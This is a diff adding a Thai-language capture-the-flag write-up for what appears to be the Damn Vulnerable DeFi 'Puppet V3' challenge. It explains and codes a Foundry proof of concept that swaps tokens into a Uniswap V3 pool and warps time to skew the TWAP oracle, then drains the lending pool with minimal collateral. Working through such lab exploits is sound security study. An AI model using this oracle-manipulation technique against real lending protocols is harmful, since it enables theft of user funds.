@@ -380,3 +380,41 @@ by tinamints
     }
 `
 
+## 14. Puppet V3
+### เงื่อนไข :
+- ดึง 1 ล้าน DVT จาก lending pool ไปยัง recovery
+- ทำให้เสร็จภายในเวลาที่กำหนด (น้อยกว่า 115 วินาทีหลังวิ่ง setup)
+### คอนเซ็ป :
+-  TWAP oracle ของ Uniswap V3
+-  ราคาเฉลี่ยถ่วงน้ำหนักตามเวลา (ใช้ `vm.warp` เพื่อบิดเบือนราคาให้มากขึ้น)
+### วิธีแก้ :
+- เทเหรียญ DVT 110 ของผู้เล่นเข้า pool Uniswap V3 ผ่าน `exactInputSingle` เพื่อกดราคาโทเคนให้ร่วง จากนั้น `vm.warp` เวลาไปข้างหน้าให้ใกล้ขีดจำกัดเวลาที่สุด เพื่อให้ TWAP บิดเบือนราคา ทำให้ `calculateDepositOfWETHRequired` ถูกลงมากพอที่จะกู้ DVT 1 ล้านโดยใช้ WETH ค้ำประกันเพียงเล็กน้อย
+### POC
+` function test_puppetV3() public checkSolvedByPlayer {
+        address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
+        token.approve(address(uniswapRouterAddress), type(uint256).max);
+        uint256 quote1 = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        console.log("quote1: ", quote1);
+ 
+        ISwapRouter(uniswapRouterAddress).exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(
+                address(token),
+                address(weth),
+                3000,
+                address(player),
+                block.timestamp,
+                PLAYER_INITIAL_TOKEN_BALANCE,
+                0,
+                0
+            )
+        );  
+         vm.warp(block.timestamp + 114);
+        uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        weth.approve(address(lendingPool), quote);
+        console.log("quote: ", quote);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery,LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        
+    }
+`
+
